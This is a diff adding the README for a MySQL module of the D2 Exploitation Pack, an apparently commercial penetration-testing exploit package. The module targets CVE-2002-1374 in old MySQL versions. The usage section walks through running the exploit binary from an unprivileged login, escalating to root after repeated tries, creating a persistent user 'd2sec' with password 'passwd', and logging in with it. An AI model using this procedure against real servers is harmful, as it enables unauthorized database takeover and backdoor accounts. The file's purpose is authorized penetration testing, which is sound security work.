@@ -1,0 +1,37 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Local exploit
+---------------
+
+MySQL COM_CHANGE_USER Password Length Account Compromise Vulnerability
+MySQL <= 3.23.53a, <= 4.0.5a
+
+CVE Name : CVE-2002-1374
+CVE URL  : http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-1374
+
+How to use the exploit
+------------------------
+
+$ mysql -u d2sec mysql
+ERROR 1044: Access denied for user: '@localhost' to database 'mysql'
+
+$ ./d2sec_mychangeuser localhost
+D2SEC (C) 2007-2009 MySQL COM_CHANGE_USER Exploit
+Connecting to mysql database on localhost as user anonymous.
+Succeeded changing to user root after 18 tries.
+Created user 'd2sec' with password 'passwd'
+
+$ mysql -u d2sec -ppasswd -h host mysql
+mysql> 
+
